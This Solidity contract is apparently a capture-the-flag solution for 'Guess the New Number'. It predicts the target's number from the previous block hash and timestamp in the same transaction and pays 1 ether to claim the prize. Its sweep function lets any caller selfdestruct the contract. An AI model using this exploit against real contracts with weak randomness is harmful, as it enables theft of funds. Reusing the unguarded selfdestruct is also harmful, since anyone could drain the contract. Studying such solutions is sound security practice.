// SPDX-License-Identifier: GPL-3.0
pragma solidity ^0.4.21; // Important to match the number guessing calculation

interface ABI {
    function guess(uint8) external payable;
}

/**
 * @title GuessTheNewNumber
 * @dev Simply calls the function with the right number, requiring 1 ether.
 */
contract GuessTheNewNumber {
    function guess(address _contract) public {
        uint8 answer = uint8(keccak256(block.blockhash(block.number - 1), now)); // Compute the new number
        ABI(_contract).guess.value(1 ether)(answer);
    }

    function sweep(address _to) public {
        selfdestruct(_to);
    }

    function GuessTheNewNumber() public payable {}
    function () payable public {}
}